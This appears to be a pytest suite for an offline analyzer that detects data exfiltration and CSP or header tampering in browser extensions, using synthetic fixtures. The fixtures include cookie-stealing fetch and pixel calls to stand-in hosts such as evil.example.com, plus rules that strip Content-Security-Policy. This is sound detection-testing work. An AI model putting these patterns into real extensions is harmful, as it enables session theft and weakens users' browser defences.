"""Offline tests for scripts/analysis/ext_exfil.py (PENT-17).

Every fixture is synthesized in pytest's tmp_path. Hosts are reserved examples only
(RFC 2606 example.* names, RFC 6761 .test, RFC 5737 TEST-NET addresses); no real
extension code is used and nothing is executed or contacted.
"""

from __future__ import annotations

import ast
import importlib.util
import json
import os
import socket
import sys
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[1] / "ext_exfil.py"
_spec = importlib.util.spec_from_file_location("ext_exfil", SCRIPT)
ext_exfil = importlib.util.module_from_spec(_spec)
sys.modules["ext_exfil"] = ext_exfil
_spec.loader.exec_module(ext_exfil)


def write_tree(root: Path, files: dict) -> Path:
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content if isinstance(content, str) else json.dumps(content), encoding="utf-8")
    return root


POSITIVE_BACKGROUND = "\n".join([
    "chrome.cookies.getAll({}, (cookies) => {",
    "  fetch('https://collect.example.net/c', { method: 'POST', body: JSON.stringify(cookies) });",
    "});",
    "navigator.sendBeacon('https://beacon.example.org/b', 'x');",
    "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://203.0.113.5/upload');",
    "const ws = new WebSocket('wss://live.example.org/socket');",
    "importScripts('https://cdn.example.com/stage2.js');",
    "fetch(chrome.runtime.getURL('data.json'));",
    "fetch('/relative/path');",
    "const ns = 'http://www.w3.org/2000/svg';",
    "const doc = 'https://docs.example.com/help';",
    "fetch(apiBase + '/v1');",
    "chrome.declarativeNetRequest.updateDynamicRules({ addRules: [] });",
])


@pytest.fixture
def positive(tmp_path: Path) -> Path:
    manifest = {
        "manifest_version": 3,
        "name": "Exfil Fixture",
        "version": "1.0.0",
        "homepage_url": "https://www.vendor.example/",
        "permissions": ["cookies", "storage", "declarativeNetRequest"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "background.js"},
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval' https://cdn.example.com; object-src 'self'",
            "sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-inline'; connect-src *",
        },
        "declarative_net_request": {"rule_resources": [{"id": "r1", "enabled": True, "path": "rules.json"}]},
    }
    rules = [
        {"id": 1, "priority": 1, "condition": {"urlFilter": "*"},
         "action": {"type": "modifyHeaders", "responseHeaders": [
             {"header": "Content-Security-Policy", "operation": "remove"},
             {"header": "X-Frame-Options", "operation": "set", "value": "ALLOWALL"}],
             "requestHeaders": [{"header": "Referer", "operation": "remove"}]}},
        {"id": 2, "priority": 1, "condition": {"urlFilter": "||shop.example.com"},
         "action": {"type": "redirect", "redirect": {"url": "https://redirect.example.net/r"}}},
    ]
    popup_html = ('<html><head><script src="https://cdn.example.com/lib.js"></script>'
                  '<script src="popup.js"></script></head><body></body></html>')
    content_js = "new Image().src = 'https://pixel.example.org/p.gif?d=' + document.cookie;\n"
    return write_tree(tmp_path / "positive", {
        "manifest.json": manifest, "rules.json": rules, "background.js": POSITIVE_BACKGROUND,
        "popup.html": popup_html, "popup.js": "console.log('popup');\n", "content.js": content_js,
        "node_modules/lib/index.js": "fetch('https://vendored.example.com/x');\n",
    })


@pytest.fixture
def mv2(tmp_path: Path) -> Path:
    manifest = {
        "manifest_version": 2,
        "name": "MV2 Fixture",
        "version": "0.1",
        "permissions": ["webRequest", "webRequestBlocking", "*://*/*"],
        "background": {"scripts": ["bg.js"], "persistent": True},
        "content_security_policy": "script-src 'self' 'unsafe-inline' https:; object-src 'self'",
    }
    bg = "\n".join([
        "chrome.webRequest.onHeadersReceived.addListener((details) => {",
        "  const responseHeaders = details.responseHeaders.filter(h => h.name.toLowerCase() !== 'content-security-policy');",
        "  return { responseHeaders };",
        "}, { urls: ['<all_urls>'] }, ['blocking', 'responseHeaders']);",
        "chrome.webRequest.onBeforeRequest.addListener((d) => {",
        "  fetch('https://sink.example.test/log', { method: 'POST', body: JSON.stringify(d.requestBody) });",
        "}, { urls: ['<all_urls>'] }, ['requestBody']);",
    ])
    return write_tree(tmp_path / "mv2", {"manifest.json": manifest, "bg.js": bg})


@pytest.fixture
def clean(tmp_path: Path) -> Path:
    manifest = {
        "manifest_version": 3,
        "name": "Clean Fixture",
        "version": "2.0.0",
        "permissions": ["storage"],
        "action": {"default_popup": "popup.html"},
        "content_security_policy": {"extension_pages": "script-src 'self'; object-src 'self'"},
    }
    popup_js = "\n".join([
        "chrome.storage.local.get('k', (v) => console.log(v));",
        "fetch(chrome.runtime.getURL('data.json')).then(r => r.json());",
        "fetch('./local.json');",
    ])
    return write_tree(tmp_path / "clean", {
        "manifest.json": manifest, "popup.js": popup_js,
        "popup.html": '<html><body><script src="popup.js"></script></body></html>', "data.json": {"a": 1},
    })


def ids(items):
    return {i["id"] for i in items}


def host(report, name):
    return next(h for h in report["hosts"] if h["host"] == name)


# --- host parsing and classification -------------------------------------------------------------

def test_split_url_and_classification():
    assert ext_exfil.split_url("https://user@API.Example.com:8443/x") == ("https", "api.example.com")
    assert ext_exfil.split_url("ws://[2001:db8::1]:9/") == ("ws", "2001:db8::1")
    assert ext_exfil.split_url("/relative") is None
    assert ext_exfil.classify_host("collect.example.net") == "external"
    assert ext_exfil.classify_host("203.0.113.5") == "external"  # documentation range, not "private"
    assert ext_exfil.classify_host("127.0.0.1") == "local"
    assert ext_exfil.classify_host("10.0.0.8") == "local"
    assert ext_exfil.classify_host("localhost") == "local"
    assert ext_exfil.classify_host("api.vendor.example", ["vendor.example"]) == "vendor"
    assert ext_exfil.classify_host("${host}") == "dynamic"
    assert ext_exfil.is_reserved_example("x.example.org") and ext_exfil.is_reserved_example("198.51.100.7")
    assert ext_exfil.is_reserved_example("a.test") and not ext_exfil.is_reserved_example("10.0.0.8")


def test_external_host_inventory(positive):
    report = ext_exfil.analyze(positive)
    names = {h["host"] for h in report["hosts"]}
    for expected in ("collect.example.net", "beacon.example.org", "203.0.113.5", "live.example.org",
                     "cdn.example.com", "pixel.example.org", "redirect.example.net", "docs.example.com", "www.vendor.example"):
        assert expected in names, expected
    assert "www.w3.org" not in names                # XML namespace literal is not a destination
    assert "vendored.example.com" not in names      # node_modules is skipped
    assert host(report, "www.vendor.example")["class"] == "vendor"
    assert host(report, "collect.example.net")["class"] == "external"
    assert all(h["reserved_example"] for h in report["hosts"])
    cdn = host(report, "cdn.example.com")
    assert {"importScripts", "html-script"} <= set(cdn["kinds"])
    assert host(report, "203.0.113.5")["schemes"] == ["http"]
    kinds = {(e["kind"], e["host"]) for e in report["endpoints"]}
    assert ("fetch", "<dynamic>") in kinds          # fetch(apiBase + ...) is recorded as dynamic
    dynamic = [e for e in report["endpoints"] if e["host"] == "<dynamic>"]
    assert [e["line"] for e in dynamic] == [12]     # fetch(chrome.runtime.getURL(...)) is internal, not dynamic
    assert not any(e["url"].startswith("/") for e in report["endpoints"])  # relative paths are internal
    assert report["offline"] is True and report["observed_network_activity"] is False


# --- exfiltration heuristics --------------------------------------------------------------------

def test_exfiltration_findings(positive):
    found = ids(ext_exfil.analyze(positive)["findings"])
    assert {
        "exfil.sensitive-source-to-external-sink", "exfil.beacon-or-pixel", "exfil.cleartext-endpoint",
        "exfil.raw-ip-endpoint", "exfil.remote-code", "exfil.dnr-redirect-external",
        "exfil.dynamic-endpoint", "exfil.dnr-dynamic-rules",
    } <= found


def test_pixel_and_cookie_in_content_script(positive):
    findings = ext_exfil.analyze(positive)["findings"]
    content = [f for f in findings if any(e["file"] == "content.js" for e in f["evidence"])]
    assert {"exfil.sensitive-source-to-external-sink", "exfil.beacon-or-pixel"} <= ids(content)
    for f in content:  # source and sink on the same line are reported once
        assert len(f["evidence"]) == len({(e["file"], e["line"]) for e in f["evidence"]})


def test_webrequest_capture_and_header_stripping_mv2(mv2):
    report = ext_exfil.analyze(mv2)
    capture = next(f for f in report["findings"] if f["id"] == "exfil.webrequest-capture")
    assert capture["evidence"][0]["line"] == 5      # the onBeforeRequest listener that asks for requestBody
    stripping = [t for t in report["header_tampering"] if t["id"] == "csp.webrequest-header-tampering"]
    assert stripping and stripping[0]["header"] == "content-security-policy" and stripping[0]["file"] == "bg.js"
    assert "*://*/*" in report["target"]["broad_host_access"]


# --- CSP and declarativeNetRequest --------------------------------------------------------------

def test_csp_relaxations_mv3(positive):
    relax = ext_exfil.analyze(positive)["csp"]["relaxations"]
    pages = {r["id"]: r for r in relax if r["source"] == "content_security_policy.extension_pages"}
    assert pages["csp.unsafe-eval"]["severity"] == "high"
    assert pages["csp.remote-script-source"]["token"] == "https://cdn.example.com"
    assert "MV3: declared" in pages["csp.unsafe-eval"]["effect"]
    sandbox = {r["id"]: r for r in relax if r["source"] == "content_security_policy.sandbox"}
    assert sandbox["csp.unsafe-inline"]["severity"] == "medium"   # sandboxed: no extension APIs
    assert sandbox["csp.wildcard-connect"]["token"] == "*"
    assert "csp.missing-object-src" in sandbox


def test_csp_relaxations_mv2_string(mv2):
    relax = ext_exfil.analyze(mv2)["csp"]["relaxations"]
    assert {"csp.unsafe-inline", "csp.remote-script-source"} <= ids(relax)
    assert all("MV3" not in r["effect"] for r in relax)
    assert next(r for r in relax if r["id"] == "csp.remote-script-source")["token"] == "https:"


def test_parse_csp_and_remote_tokens():
    d = ext_exfil.parse_csp("script-src 'self' blob: https://a.example.com; object-src 'none';")
    assert d == {"script-src": ["'self'", "blob:", "https://a.example.com"], "object-src": ["'none'"]}
    assert ext_exfil._remote_source("https://a.example.com") and ext_exfil._remote_source("*")
    assert not ext_exfil._remote_source("'self'") and not ext_exfil._remote_source("blob:")


def test_dnr_header_tampering(positive):
    tampering = ext_exfil.analyze(positive)["header_tampering"]
    got = {(t["header"], t["operation"], t["severity"]) for t in tampering if t["source"] == "declarativeNetRequest"}
    assert ("content-security-policy", "remove", "high") in got
    assert ("x-frame-options", "set", "medium") in got
    assert ("referer", "remove", "medium") in got
    assert all(t["file"] == "rules.json" for t in tampering if t["source"] == "declarativeNetRequest")


def test_dnr_rule_path_cannot_escape_tree(tmp_path):
    (tmp_path / "outside.json").write_text(json.dumps([{"id": 1, "action": {"type": "modifyHeaders", "responseHeaders": [
        {"header": "content-security-policy", "operation": "remove"}]}}]), encoding="utf-8")
    ext = write_tree(tmp_path / "ext", {"manifest.json": {
        "manifest_version": 3, "name": "Escape", "version": "1",
        "declarative_net_request": {"rule_resources": [{"id": "r", "enabled": True, "path": "../outside.json"}]}}})
    report = ext_exfil.analyze(ext)
    assert report["header_tampering"] == []
    assert any("../outside.json" in lim for lim in report["limitations"])


# --- clean stays clean ---------------------------------------------------------------------------

def test_clean_extension_has_no_findings(clean):
    report = ext_exfil.analyze(clean)
    assert report["hosts"] == []
    assert report["endpoints"] == []
    assert report["findings"] == []
    assert report["csp"]["relaxations"] == []
    assert report["header_tampering"] == []
    assert not ext_exfil.has_failing_findings(report)


# --- report output -------------------------------------------------------------------------------

def test_json_report_is_deterministic(positive):
    a = ext_exfil.render(ext_exfil.analyze(positive), "json")
    b = ext_exfil.render(ext_exfil.analyze(positive), "json")
    assert a == b
    data = json.loads(a)
    assert data["tool"] == "ext_exfil" and data["offline"] is True and data["observed_network_activity"] is False
    assert "not observed network activity" in data["disclaimer"]


@pytest.mark.parametrize("fmt", ["text", "md"])
def test_human_report_sections_and_wording(positive, fmt):
    out = ext_exfil.render(ext_exfil.analyze(positive), fmt)
    assert "External hosts statically referenced (potential destinations, not observed traffic)" in out
    assert "not observed network activity" in out
    assert "CSP relaxations" in out and "Security-header tampering" in out and "Limitations" in out
    assert "collect.example.net" in out and "'unsafe-eval'" in out
    if fmt == "md":
        assert "| Host | Class |" in out


def test_clean_report_wording(clean):
    out = ext_exfil.render(ext_exfil.analyze(clean), "text")
    assert "No external hosts are statically referenced." in out
    assert "No CSP relaxations found." in out


# --- CLI ----------------------------------------------------------------------------------------

def test_cli_exit_codes(positive, clean, tmp_path, capsys):
    assert ext_exfil.main([str(clean)]) == 0
    capsys.readouterr()
    assert ext_exfil.main([str(positive), "--format", "json"]) == 1
    assert json.loads(capsys.readouterr().out)["tool"] == "ext_exfil"
    assert ext_exfil.main([str(positive / "manifest.json")]) == 1      # manifest path accepted
    assert ext_exfil.main([str(tmp_path / "missing")]) == 2
    (tmp_path / "empty").mkdir()
    assert ext_exfil.main([str(tmp_path / "empty")]) == 2               # no manifest.json
    assert ext_exfil.main([]) == 2
    assert ext_exfil.main([str(clean), "--max-files", "0"]) == 2


def test_cli_output_file_and_refuses_writing_into_tree(positive, tmp_path, capsys):
    out = tmp_path / "report.md"
    assert ext_exfil.main([str(positive), "--format", "md", "-o", str(out)]) == 1
    assert out.read_text(encoding="utf-8").startswith("# Extension exfiltration & CSP report: Exfil Fixture")
    assert ext_exfil.main([str(positive), "-o", str(positive / "report.txt")]) == 2
    assert not (positive / "report.txt").exists()
    nested = write_tree(tmp_path / "nested", {"src/manifest.json": {"manifest_version": 3, "name": "N", "version": "1"}})
    assert ext_exfil.main([str(nested), "-o", str(nested / "report.txt")]) == 2   # manifest in src/, output in the given dir
    assert not (nested / "report.txt").exists()
    assert ext_exfil.main([str(nested), "-o", str(tmp_path / "nested-report.txt")]) == 0


def test_analysis_does_not_modify_tree(positive):
    before = sorted((p.relative_to(positive).as_posix(), p.stat().st_mtime_ns) for p in positive.rglob("*"))
    ext_exfil.analyze(positive)
    after = sorted((p.relative_to(positive).as_posix(), p.stat().st_mtime_ns) for p in positive.rglob("*"))
    assert before == after


# --- offline guarantees -------------------------------------------------------------------------

FORBIDDEN_MODULES = {"socket", "ssl", "urllib", "http", "requests", "subprocess", "asyncio", "ftplib", "smtplib", "webbrowser"}


def test_script_imports_no_network_or_process_modules():
    tree = ast.parse(SCRIPT.read_text(encoding="utf-8"))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    assert not imported & FORBIDDEN_MODULES, imported & FORBIDDEN_MODULES
    assert "__import__" not in SCRIPT.read_text(encoding="utf-8")


def test_analysis_makes_no_network_calls(positive, mv2, monkeypatch):
    def blocked(*args, **kwargs):
        raise AssertionError("ext_exfil attempted network access")
    for name in ("socket", "create_connection", "getaddrinfo", "gethostbyname", "gethostbyname_ex"):
        monkeypatch.setattr(socket, name, blocked)
    for target in (positive, mv2):
        ext_exfil.render(ext_exfil.analyze(target), "md")


# --- robustness: malformed shapes, links/junctions, size caps -------------------------------------

BASE = {"manifest_version": 3, "name": "Shape", "version": "1"}


@pytest.mark.parametrize("extra", [
    {"content_scripts": 7},
    {"content_scripts": "content.js"},
    {"content_scripts": {"matches": ["<all_urls>"]}},
    {"content_scripts": [{"matches": 5}, 3, None]},
    {"permissions": {"cookies": True}, "host_permissions": 9},
    {"externally_connectable": ["x"]},
    {"homepage_url": 5, "update_url": ["https://u.example.com/"]},
    {"manifest_version": "three"},
    {"name": ["n"], "version": {"v": 1}},
    {"content_security_policy": 5},
    {"content_security_policy": {"extension_pages": 5, "sandbox": None}},
    {"sandbox": 5},
    {"sandbox": {"pages": "x.html", "content_security_policy": 7}},
    {"declarative_net_request": 5},
    {"declarative_net_request": {"rule_resources": "rules.json"}},
    {"declarative_net_request": {"rule_resources": [5, {"path": 7}, {"path": None}]}},
], ids=lambda e: json.dumps(e)[:60])
def test_malformed_manifest_shapes_do_not_crash(tmp_path, capsys, extra):
    ext = write_tree(tmp_path / "ext", {"manifest.json": dict(BASE, **extra)})
    for fmt in ("text", "md", "json"):
        assert ext_exfil.main([str(ext), "--format", fmt]) == 0
        captured = capsys.readouterr()
        assert captured.err == ""


def test_malformed_dnr_rules_do_not_crash(tmp_path, capsys):
    rules = [
        5, "x", None,
        {"id": [1], "action": 5},
        {"id": {"a": 1}, "action": {"responseHeaders": 7, "requestHeaders": {"header": "referer"}}},
        {"action": {"responseHeaders": [5, {"header": 5, "operation": ["remove"]}, {"header": "x-frame-options"}]}},
        {"action": {"type": "redirect", "redirect": 5}},
        {"action": {"type": "redirect", "redirect": {"url": 5, "regexSubstitution": 6, "transform": {"host": 7}}}},
        {"action": {"type": "redirect", "redirect": {"transform": 5}}},
    ]
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": dict(BASE, declarative_net_request={"rule_resources": [
            {"path": "rules.json"}, {"path": "obj.json"}, {"path": "bad.json"}]}),
        "rules.json": rules, "obj.json": {"rules": []}, "bad.json": "{not json",
    })
    assert ext_exfil.main([str(ext), "--format", "md"]) == 0
    captured = capsys.readouterr()
    assert captured.err == ""
    assert "obj.json is not a JSON array" in captured.out and "bad.json is not valid JSON" in captured.out
    report = ext_exfil.analyze(ext)
    assert report["header_tampering"] == [] and report["endpoints"] == []


def test_deeply_nested_manifest_is_an_input_error(tmp_path, capsys):
    ext = tmp_path / "deep"
    ext.mkdir()
    (ext / "manifest.json").write_text("[" * 200000 + "]" * 200000, encoding="utf-8")
    assert ext_exfil.main([str(ext)]) == 2
    err = capsys.readouterr().err
    assert err.startswith("error: ") and "Traceback" not in err


def test_unexpected_internal_error_is_exit_2_not_findings(clean, monkeypatch, capsys):
    def boom(*args, **kwargs):
        raise TypeError("unexpected shape")
    monkeypatch.setattr(ext_exfil, "scan_source", boom)
    assert ext_exfil.main([str(clean)]) == 2
    err = capsys.readouterr().err
    assert "cannot analyze this input (TypeError" in err and "Traceback" not in err


def test_manifest_size_cap(tmp_path, monkeypatch, capsys):
    ext = write_tree(tmp_path / "ext", {"manifest.json": dict(BASE, description="x" * 400)})
    monkeypatch.setattr(ext_exfil, "MAX_MANIFEST_BYTES", 256)
    assert ext_exfil.main([str(ext)]) == 2
    assert "larger than 256 bytes" in capsys.readouterr().err


def test_dnr_rule_file_size_cap(tmp_path, monkeypatch):
    rules = [{"id": 1, "action": {"type": "modifyHeaders", "responseHeaders": [
        {"header": "content-security-policy", "operation": "remove"}]}}]
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": dict(BASE, declarative_net_request={"rule_resources": [{"path": "rules.json"}]}),
        "rules.json": rules})
    assert ext_exfil.analyze(ext)["header_tampering"]          # analyzed under the default cap
    monkeypatch.setattr(ext_exfil, "MAX_RULE_FILE_BYTES", 32)
    report = ext_exfil.analyze(ext)
    assert report["header_tampering"] == []
    assert any("rules.json is larger than 32 bytes" in lim for lim in report["limitations"])


def _outside_and_ext(tmp_path):
    outside = write_tree(tmp_path / "outside", {"lib.js": "fetch('https://outside.example.org/x' + document.cookie);\n"})
    ext = write_tree(tmp_path / "ext", {"manifest.json": BASE, "main.js": "console.log(1);\n"})
    return outside, ext


@pytest.mark.skipif(sys.platform != "win32", reason="NTFS junctions exist only on Windows")
def test_ntfs_junction_is_not_followed_out_of_tree(tmp_path):
    import _winapi
    outside, ext = _outside_and_ext(tmp_path)
    _winapi.CreateJunction(str(outside), str(ext / "lib"))
    assert (ext / "lib" / "lib.js").is_file()                    # the junction really resolves outside
    report = ext_exfil.analyze(ext)
    assert "outside.example.org" not in {h["host"] for h in report["hosts"]}
    assert report["findings"] == []
    assert any("lib: symlink/junction directory, not followed" in lim for lim in report["limitations"])


@pytest.mark.skipif(sys.platform != "win32", reason="NTFS junctions exist only on Windows")
def test_dnr_rule_file_through_junction_is_rejected(tmp_path):
    import _winapi
    rules = [{"id": 1, "action": {"type": "modifyHeaders", "responseHeaders": [
        {"header": "content-security-policy", "operation": "remove"}]}}]
    outside = write_tree(tmp_path / "outside", {"rules.json": rules})
    ext = write_tree(tmp_path / "ext", {"manifest.json": dict(BASE, declarative_net_request={
        "rule_resources": [{"path": "rules/rules.json"}]})})
    _winapi.CreateJunction(str(outside), str(ext / "rules"))
    report = ext_exfil.analyze(ext)
    assert report["header_tampering"] == []
    assert any("not readable inside the package: rules/rules.json" in lim for lim in report["limitations"])


def test_symlinked_directory_is_not_followed_out_of_tree(tmp_path):
    outside, ext = _outside_and_ext(tmp_path)
    try:
        os.symlink(outside, ext / "lib", target_is_directory=True)
    except (OSError, NotImplementedError) as exc:
        pytest.skip(f"symlinks not permitted here: {exc}")
    report = ext_exfil.analyze(ext)
    assert "outside.example.org" not in {h["host"] for h in report["hosts"]}


# --- protocol-relative endpoints ----------------------------------------------------------------

def test_protocol_relative_endpoints_are_extracted(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": dict(BASE, content_scripts=[{"matches": ["https://shop.example.com/*"], "js": ["content.js"]}]),
        "content.js": "fetch('//evil.example.com/c?d=' + document.cookie);\nconst note = '//just a comment-like string';\n",
        "popup.html": '<html><script src="//cdn.example.org/a.js"></script><a href="/local">x</a></html>',
    })
    assert ext_exfil.split_url("//evil.example.com/c") == ("protocol-relative", "evil.example.com")
    # WHATWG: against a special (http/https page) base, extra slashes are skipped before the host.
    assert ext_exfil.split_url("///x") == ("protocol-relative", "x") and ext_exfil.split_url("/x") is None
    report = ext_exfil.analyze(ext)
    evil = host(report, "evil.example.com")
    assert evil["schemes"] == ["protocol-relative"] and evil["class"] == "external"
    assert "fetch" in evil["kinds"]
    # In an extension page "//cdn..." resolves to chrome-extension://cdn.example.org/: not the network (L4).
    cdn = host(report, "cdn.example.org")
    assert "html-script" in cdn["kinds"] and cdn["class"] == "extension-origin"
    found = ids(report["findings"])
    assert "exfil.sensitive-source-to-external-sink" in found
    assert "exfil.remote-code" not in found
    assert "exfil.cleartext-endpoint" not in found              # scheme is inherited, not known cleartext
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


# --- output sanitizing --------------------------------------------------------------------------

BS = chr(92)
ESC, RLO, BEL = chr(0x1B), chr(0x202E), chr(0x07)


def bs(chars):
    """Each character preceded by a backslash (the Markdown escape)."""
    return "".join(BS + c for c in chars)


def test_untrusted_strings_are_sanitized_in_text_and_md(tmp_path):
    name = f"Evil{ESC}[31m{RLO}<img src=x onerror=alert(1)>|**bold**[link](https://phish.example.com)"
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": dict(BASE, name=name, content_security_policy={
            "extension_pages": f"script-src 'self' https://cdn.example.com/{BEL}`x` ; object-src 'self'"}),
        f"a{RLO}b.js": f"fetch('https://collect.example.net/{ESC}]0;title{BEL}' + document.cookie);\n",
    })
    report = ext_exfil.analyze(ext)
    for fmt in ("text", "md"):
        out = ext_exfil.render(report, fmt)
        for ch in (ESC, RLO, BEL):
            assert ch not in out, (fmt, hex(ord(ch)))
        assert BS + "x1b" in out and BS + "u202e" in out and BS + "x07" in out
    md = ext_exfil.render(report, "md")
    assert "<img" not in md.replace(bs("<"), "") and bs("<") + "img src=x onerror=alert(1)" + bs(">") in md
    assert bs("|**") + "bold" + bs("**[") + "link" + bs("]") in md
    assert "`x`" not in md.replace(bs("`"), "") and bs("`") + "x" + bs("`") in md
    data = ext_exfil.render(report, "json")
    assert all(ord(c) < 128 for c in data)                      # ensure_ascii: escapes, never raw controls
    assert json.loads(data)["target"]["name"] == name           # JSON keeps the exact value


def test_error_messages_are_sanitized(tmp_path, capsys):
    bad = tmp_path / f"no{ESC}[2Jsuch"
    assert ext_exfil.main([str(bad)]) == 2
    err = capsys.readouterr().err
    assert ESC not in err and BS + "x1b[2J" in err


# --- CSP: MV2 sandbox and directive overrides ---------------------------------------------------

def test_mv2_sandbox_csp_is_inspected(tmp_path):
    sandbox_csp = "sandbox allow-scripts; script-src 'self' 'unsafe-eval' https://cdn.example.com; object-src 'none'"
    ext = write_tree(tmp_path / "ext", {"manifest.json": {
        "manifest_version": 2, "name": "SB2", "version": "1",
        "sandbox": {"pages": ["sandbox.html"], "content_security_policy": sandbox_csp}}})
    report = ext_exfil.analyze(ext)
    relax = [r for r in report["csp"]["relaxations"] if r["source"] == "sandbox.content_security_policy"]
    assert {"csp.unsafe-eval", "csp.remote-script-source"} <= ids(relax)
    assert all(r["severity"] == "medium" and "sandboxed page" in r["effect"] for r in relax)
    assert all("MV3" not in r["effect"] for r in relax)
    assert ext_exfil.has_failing_findings(report)


def test_mv2_sandbox_csp_not_applicable_cases(tmp_path):
    csp = "script-src 'self' 'unsafe-eval'"
    mv3 = write_tree(tmp_path / "mv3", {"manifest.json": dict(BASE, sandbox={"pages": ["s.html"], "content_security_policy": csp})})
    nopages = write_tree(tmp_path / "np", {"manifest.json": {"manifest_version": 2, "name": "n", "version": "1",
                                                              "sandbox": {"pages": [], "content_security_policy": csp}}})
    for ext, note in ((mv3, "ignored in Manifest V3"), (nopages, "sandbox.pages lists no page")):
        report = ext_exfil.analyze(ext)
        assert report["csp"]["relaxations"] == []
        assert any(note in lim for lim in report["limitations"])


def test_csp_elem_attr_worker_directives(tmp_path):
    policy = ("script-src 'self'; script-src-elem 'self' 'unsafe-inline' https://cdn.example.com data:; "
              "script-src-attr 'unsafe-inline' https://ignored.example.com; worker-src 'self' blob: https://w.example.net; "
              "object-src 'self'")
    ext = write_tree(tmp_path / "ext", {"manifest.json": {"manifest_version": 2, "name": "D", "version": "1",
                                                           "content_security_policy": policy}})
    relax = ext_exfil.analyze(ext)["csp"]["relaxations"]
    got = {(r["id"], r["directive"], r["token"]) for r in relax}
    assert ("csp.unsafe-inline", "script-src-elem", "'unsafe-inline'") in got
    assert ("csp.remote-script-source", "script-src-elem", "https://cdn.example.com") in got
    assert ("csp.data-blob-script-source", "script-src-elem", "data:") in got
    assert ("csp.unsafe-inline", "script-src-attr", "'unsafe-inline'") in got
    assert not any(d == "script-src-attr" and i != "csp.unsafe-inline" for i, d, _ in got)
    assert ("csp.data-blob-worker-source", "worker-src", "blob:") in got
    assert ("csp.remote-worker-source", "worker-src", "https://w.example.net") in got
    assert not any(d == "script-src" for _, d, _ in got)        # the base script-src itself is strict
    attr = next(r for r in relax if r["directive"] == "script-src-attr")
    # MV2 extension pages: Chromium documents 'unsafe-inline' as having no effect (L2).
    assert attr["severity"] == "low" and "MV2" in attr["effect"] and "no effect" in attr["effect"]


def test_child_src_is_the_worker_fallback(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": {"manifest_version": 2, "name": "C", "version": "1",
                                                           "content_security_policy": "script-src 'self'; child-src blob:; object-src 'self'"}})
    got = {(r["id"], r["directive"]) for r in ext_exfil.analyze(ext)["csp"]["relaxations"]}
    assert got == {("csp.data-blob-worker-source", "child-src")}


# =================================================================================================
# Regression tests for the independent deep review (TASK-20261113-142904-2070-independent.md).
# Every fixture is synthetic, built in tmp_path, with reserved example hosts / documentation IPs.
# =================================================================================================

import io
import ipaddress
import threading
import time

JA = chr(0x65E5) + chr(0x672C)            # two CJK characters, not encodable in cp1252/cp1254
CYR_O = chr(0x043E)                       # Cyrillic small o (homoglyph of Latin o)
TAG_A = chr(0xE0041)                      # Unicode TAG LATIN CAPITAL LETTER A (invisible)
SHY = chr(0x00AD)                         # soft hyphen (invisible)


def mv3(**extra):
    return dict({"manifest_version": 3, "name": "R", "version": "1"}, **extra)


# --- H1: output encoding --------------------------------------------------------------------------

@pytest.mark.parametrize("fmt", ["text", "md", "json"])
def test_h1_non_ascii_report_on_cp1254_stdout_is_not_a_crash(tmp_path, monkeypatch, fmt):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(name=JA)})
    raw = io.BytesIO()
    monkeypatch.setattr(sys, "stdout", io.TextIOWrapper(raw, encoding="cp1254"))
    assert ext_exfil.main([str(ext), "--format", fmt]) == 0           # clean extension: exit 0, not 1
    sys.stdout.flush()
    out = raw.getvalue().decode("cp1254")
    assert "\\u65e5\\u672c" in out                                   # escaped, not lost and not a traceback


def test_h1_non_ascii_error_message_on_cp1254_stderr(tmp_path, monkeypatch):
    raw = io.BytesIO()
    monkeypatch.setattr(sys, "stderr", io.TextIOWrapper(raw, encoding="cp1254"))
    assert ext_exfil.main([str(tmp_path / f"missing-{JA}")]) == 2
    sys.stderr.flush()
    err = raw.getvalue().decode("cp1254")
    assert err.startswith("error: ") and "\\u65e5" in err and "Traceback" not in err


def test_h1_broken_pipe_is_exit_2_not_findings(clean, monkeypatch, capsys):
    class Broken(io.TextIOBase):
        encoding = "utf-8"

        def write(self, s):
            raise BrokenPipeError(32, "Broken pipe")

    monkeypatch.setattr(sys, "stdout", Broken())
    assert ext_exfil.main([str(clean)]) == 2
    assert "cannot write the report to stdout" in capsys.readouterr().err


# --- H2: no super-linear regex work on crafted input ----------------------------------------------

@pytest.mark.parametrize("rel,unit", [
    ("p.html", "<img "),                 # review repro: 100 KB took 25.6 s, 200 KB took 102 s
    ("p.html", "<img src='"),            # unclosed quoted attribute
    ("p.html", "<script "),
    ("p.js", "new Image("),              # review repro for the pixel sink
    ("p.js", "fetch(\""),                # unclosed literal at a sink
    ("p.js", "import "),
    ("p.js", "files:["),
    ("p.js", "return "),
])
def test_h2_pathological_input_is_scanned_in_linear_time(rel, unit):
    text = unit * (400_000 // len(unit))   # ~400 KB, twice the review's 200 KB case
    start = time.perf_counter()
    ext_exfil.scan_source(rel, text)
    assert time.perf_counter() - start < 3.0, unit


def test_h2_html_tag_parsing_still_extracts_attributes():
    html_text = ('<script type="module" src="https://cdn.example.com/a.js"></script>'
                 "<img alt='x' src='https://img.example.net/p.gif'><form action=https://post.example.org/f>"
                 '<iframe data-src="https://not-this.example.com/" src="https://frame.example.com/"></iframe>')
    kinds = {(e["kind"], e["url"]) for e in ext_exfil.scan_source("p.html", html_text)["endpoints"]}
    assert ("html-script", "https://cdn.example.com/a.js") in kinds
    assert ("html-img", "https://img.example.net/p.gif") in kinds
    assert ("html-form", "https://post.example.org/f") in kinds
    assert ("html-iframe", "https://frame.example.com/") in kinds
    assert not any(k.startswith("html-") and "not-this" in u for k, u in kinds)   # data-src is not src


# --- H3: manifest-referenced code in dist/, build/, node_modules/ ---------------------------------

EXFIL_JS = ("chrome.cookies.getAll({}, c => fetch('https://collect.example.net/c', {method: 'POST', body: JSON.stringify(c)}));\n"
